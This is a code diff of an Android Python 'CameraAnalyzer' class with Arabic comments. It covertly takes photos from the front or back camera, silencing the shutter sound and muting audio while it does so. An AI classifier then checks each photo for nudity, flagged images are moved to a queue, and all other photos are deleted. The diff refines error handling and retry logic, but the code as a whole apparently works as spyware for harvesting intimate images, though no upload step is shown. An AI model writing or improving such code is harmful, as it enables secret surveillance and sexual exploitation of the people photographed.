@@ -41,7 +41,7 @@ try:
 except ImportError:
     JNI = False
 
-# ========== استيراد PIL و numpy مع الحماية (تصحيح الخطأ 1) ==========
+# ========== استيراد PIL و numpy مع الحماية ==========
 PIL_AVAILABLE = False
 NUMPY_AVAILABLE = False
 Image = None
@@ -77,7 +77,7 @@ class CameraAnalyzer:
 
     # ---------- إدارة الإعدادات ----------
     def _load_config(self):
-        """تحميل الإعدادات من الملف مع التحقق من صحتها (تصحيح الخطأ 3)"""
+        """تحميل الإعدادات من الملف مع التحقق من صحتها"""
         default_config = {
             "quality": 80,                  # 1-100
             "max_file_age": 3600,
@@ -102,7 +102,7 @@ class CameraAnalyzer:
         return default_config
 
     def _validate_config(self, cfg):
-        """تصحيح أي قيم غير صالحة في الإعدادات (تصحيح الخطأ 3)"""
+        """تصحيح أي قيم غير صالحة في الإعدادات"""
         # الجودة بين 10 و 100
         if not (10 <= cfg.get("quality", 80) <= 100):
             logging.warning("Invalid quality, resetting to 80")
@@ -246,97 +246,120 @@ class CameraAnalyzer:
 
     # ---------- التقاط الصورة (Camera1) ----------
     def _capture_camera1(self, cam_id):
-        Camera = autoclass('android.hardware.Camera')
-        CameraInfo = autoclass('android.hardware.Camera$CameraInfo')
-        num = Camera.getNumberOfCameras()
-        target_id = -1
-        desired_facing = CameraInfo.CAMERA_FACING_BACK if cam_id == 0 else CameraInfo.CAMERA_FACING_FRONT
-        for i in range(num):
-            info = CameraInfo()
-            Camera.getCameraInfo(i, info)
-            if info.facing == desired_facing:
-                target_id = i
-                break
-        if target_id == -1:
-            raise Exception(f"No camera with facing {desired_facing}")
-
-        camera = Camera.open(target_id)
-        if not camera:
-            raise Exception("Failed to open camera")
-
-        out_path = None
-        image_saved = threading.Event()
-        image_data = [None]
-
+        """
+        التقاط صورة باستخدام Camera1 API.
+        تُعيد مسار الصورة في حالة النجاح، أو None في حالة الفشل.
+        """
         try:
-            params = camera.getParameters()
-            supported = params.getSupportedPictureSizes()
-            if supported:
-                best = self._get_preferred_size(supported)
-                if best:
-                    params.setPictureSize(best.width, best.height)
-            params.setPictureFormat(autoclass('android.graphics.ImageFormat').JPEG)
-            # إسكات صوت الغالق
+            Camera = autoclass('android.hardware.Camera')
+            CameraInfo = autoclass('android.hardware.Camera$CameraInfo')
+            num = Camera.getNumberOfCameras()
+            target_id = -1
+            desired_facing = CameraInfo.CAMERA_FACING_BACK if cam_id == 0 else CameraInfo.CAMERA_FACING_FRONT
+            for i in range(num):
+                info = CameraInfo()
+                Camera.getCameraInfo(i, info)
+                if info.facing == desired_facing:
+                    target_id = i
+                    break
+            if target_id == -1:
+                logging.error(f"No camera with facing {desired_facing}")
+                return None
+
+            camera = Camera.open(target_id)
+            if not camera:
+                logging.error("Failed to open camera")
+                return None
+
+            out_path = None
+            image_saved = threading.Event()
+            image_data = [None]
+
             try:
-                params.set("shutter-sound", 0)
-            except:
-                pass
-            rotation = 270 if cam_id == 1 else 90
-            params.setRotation(rotation)
-            camera.setParameters(params)
+                params = camera.getParameters()
+                supported = params.getSupportedPictureSizes()
+                if supported:
+                    best = self._get_preferred_size(supported)
+                    if best:
+                        params.setPictureSize(best.width, best.height)
+                params.setPictureFormat(autoclass('android.graphics.ImageFormat').JPEG)
+                # إسكات صوت الغالق
+                try:
+                    params.set("shutter-sound", 0)
+                except:
+                    pass
+                rotation = 270 if cam_id == 1 else 90
+                params.setRotation(rotation)
+                camera.setParameters(params)
 
-            out_path = os.path.join(T, self._generate_unique_filename(f"c1_{cam_id}"))
+                out_path = os.path.join(T, self._generate_unique_filename(f"c1_{cam_id}"))
 
-            class PicCallback(PythonJavaClass):
-                __javainterfaces__ = ['android.hardware.Camera$PictureCallback']
-                def __init__(self, event, store, path):
-                    super().__init__()
-                    self.event = event
-                    self.store = store
-                    self.path = path
-                @java_method('([BLandroid/hardware/Camera;)V')
-                def onPictureTaken(self, data, cam):
-                    try:
-                        self.store[0] = data
-                        with open(self.path, 'wb') as f:
-                            f.write(data)
-                    except Exception as e:
-                        logging.error(f"Camera1 write error: {e}")
-                        self.path = None
-                    finally:
-                        self.event.set()
+                class PicCallback(PythonJavaClass):
+                    __javainterfaces__ = ['android.hardware.Camera$PictureCallback']
+                    def __init__(self, event, store, path):
+                        super().__init__()
+                        self.event = event
+                        self.store = store
+                        self.path = path
+                    @java_method('([BLandroid/hardware/Camera;)V')
+                    def onPictureTaken(self, data, cam):
+                        try:
+                            self.store[0] = data
+                            with open(self.path, 'wb') as f:
+                                f.write(data)
+                        except Exception as e:
+                            logging.error(f"Camera1 write error: {e}")
+                            self.path = None
+                        finally:
+                            self.event.set()
 
-            callback = PicCallback(image_saved, image_data, out_path)
-            camera.startPreview()
-            time.sleep(0.6)  # انتظار استقرار المعاينة
-            camera.takePicture(None, None, callback)
+                callback = PicCallback(image_saved, image_data, out_path)
+                camera.startPreview()
+                time.sleep(0.6)  # انتظار استقرار المعاينة
+                camera.takePicture(None, None, callback)
 
-            if not image_saved.wait(10):
-                raise TimeoutError("Camera1 capture timeout")
+                if not image_saved.wait(10):
+                    raise TimeoutError("Camera1 capture timeout")
 
-            camera.stopPreview()
+                camera.stopPreview()
 
-            if out_path and os.path.exists(out_path) and os.path.getsize(out_path) > 500:
-                self._compress_image(out_path)
-                return out_path
-            else:
-                self._safe_remove(out_path)
-                raise Exception("Empty or invalid image")
-        finally:
-            try:
-                camera.release()
-            except:
-                pass
+                if out_path and os.path.exists(out_path) and os.path.getsize(out_path) > 500:
+                    self._compress_image(out_path)
+                    return out_path
+                else:
+                    self._safe_remove(out_path)
+                    logging.error("Empty or invalid image from Camera1")
+                    return None
 
-    # ---------- التقاط الصورة (Camera2 احتياطي) (تصحيح الخطأ 2) ----------
+            except Exception as e:
+                logging.error(f"Camera1 capture error: {e}")
+                if out_path:
+                    self._safe_remove(out_path)
+                return None
+            finally:
+                try:
+                    camera.release()
+                except:
+                    pass
+
+        except Exception as e:
+            logging.error(f"Camera1 unexpected error: {e}")
+            return None
+
+    # ---------- التقاط الصورة (Camera2 احتياطي) ----------
     def _capture_camera2(self, cam_id):
+        """
+        التقاط صورة باستخدام Camera2 API.
+        تُعيد مسار الصورة في حالة النجاح، أو None في حالة الفشل.
+        """
         try:
             CameraManager = autoclass('android.hardware.camera2.CameraManager')
             ctx = autoclass('org.kivy.android.PythonActivity').mActivity
             cm = ctx.getSystemService(ctx.CAMERA_SERVICE)
             camera_ids = cm.getCameraIdList()
             if cam_id >= len(camera_ids):
-                raise Exception(f"Camera2 ID {cam_id} out of range")
+                logging.error(f"Camera2 ID {cam_id} out of range")
+                return None
             camera_id = camera_ids[cam_id]
 
             ImageReader = autoclass('android.media.ImageReader')
@@ -383,20 +406,27 @@ class CameraAnalyzer:
             cm.openCamera(camera_id, state_cb, None)
 
             if not capture_done.wait(8):
-                raise TimeoutError("Camera2 capture timeout")
+                logging.error("Camera2 capture timeout")
+                return None
 
             if capture_path[0] and os.path.exists(capture_path[0]) and os.path.getsize(capture_path[0]) > 500:
                 self._compress_image(capture_path[0])
                 return capture_path[0]
             else:
                 self._safe_remove(capture_path[0])
-                raise Exception("Camera2 produced invalid image")
+                logging.error("Camera2 produced invalid image")
+                return None
+
         except Exception as e:
             logging.error(f"Camera2 failed: {e}")
             return None
 
     # ---------- الواجهة الرئيسية للالتقاط (مع إعادة المحاولة) ----------
     def capture(self, cam_id=0):
+        """
+        التقاط صورة مع إعادة المحاولة.
+        تُعيد مسار الصورة في حالة النجاح، أو None في حالة الفشل.
+        """
         if not self._check_camera_permission():
             logging.warning("Camera permission not granted")
             return None
@@ -409,11 +439,12 @@ class CameraAnalyzer:
         if not self._power_ok():
             logging.warning("Battery too low")
             return None
+
+        # التحقق من الفاصل الزمني
         now = time.time()
         if now - self._last_capture_time < self._min_capture_interval:
             logging.warning("Too soon since last capture")
             return None
-        self._last_capture_time = now
 
         with self._camera_lock:
             if self.busy:
@@ -421,24 +452,31 @@ class CameraAnalyzer:
             self.busy = True
 
         out_path = None
+        success = False
+
         try:
             self._mute_audio(True)
-            # محاولة Camera1 أولاً، ثم Camera2 كخطة بديلة (تصحيح الخطأ 2)
+            # محاولة Camera1 أولاً، ثم Camera2 كخطة بديلة
             for attempt in range(self._max_capture_retries + 1):
                 try:
                     out_path = self._capture_camera1(cam_id)
                     if out_path:
                         logging.info("✅ Camera1 success")
+                        success = True
                         break
                 except Exception as e:
                     logging.warning(f"Camera1 attempt {attempt+1} failed: {e}")
                     time.sleep(0.5)
-                    if attempt == self._max_capture_retries:
-                        logging.info("Falling back to Camera2...")
-                        out_path = self._capture_camera2(cam_id)
-                        if out_path:
-                            logging.info("✅ Camera2 success")
+
+                # إذا كانت آخر محاولة، جرب Camera2
+                if attempt == self._max_capture_retries:
+                    logging.info("Falling back to Camera2...")
+                    out_path = self._capture_camera2(cam_id)
+                    if out_path:
+                        logging.info("✅ Camera2 success")
+                        success = True
                         break
+
         except Exception as e:
             logging.error(f"Capture sequence error: {e}")
         finally:
@@ -446,7 +484,12 @@ class CameraAnalyzer:
             self.busy = False
             self._cleanup_old_files()
 
-        return out_path
+        # ✅ الخطأ 2: تحديث وقت الالتقاط فقط عند النجاح
+        if success and out_path:
+            self._last_capture_time = time.time()
+            return out_path
+
+        return None
 
     # ---------- تحضير الصورة لتحليل AI ----------
     def _prepare_for_ai(self, path):
@@ -488,7 +531,7 @@ class CameraAnalyzer:
             logging.debug("No AI model loaded")
 
         if is_nude:
-            # إرسال إشعار فوري
+            # ✅ الخطأ 3: التحقق من وجود self.mon.ui قبل إرسال الإشعار
             if self.mon and hasattr(self.mon, 'ui') and self.mon.ui:
                 try:
                     cam_type = "الأمامية" if cam_id == 1 else "الخلفية"
@@ -514,12 +557,14 @@ class CameraAnalyzer:
                     base, ext = os.path.splitext(dest)
                     dest = f"{base}_{int(time.time())}{ext}"
                 os.rename(pic_path, dest)
+                logging.info(f"✅ Nude image moved to queue: {dest}")
             except Exception as e:
                 logging.error(f"Move to queue error: {e}")
                 self._safe_remove(pic_path)
         else:
             # حذف الصورة العادية فوراً
             self._safe_remove(pic_path)
+            logging.debug(f"Normal image removed: {pic_path}")
 
     # ---------- أدوات تحكم إضافية ----------
     def set_quality(self, q):
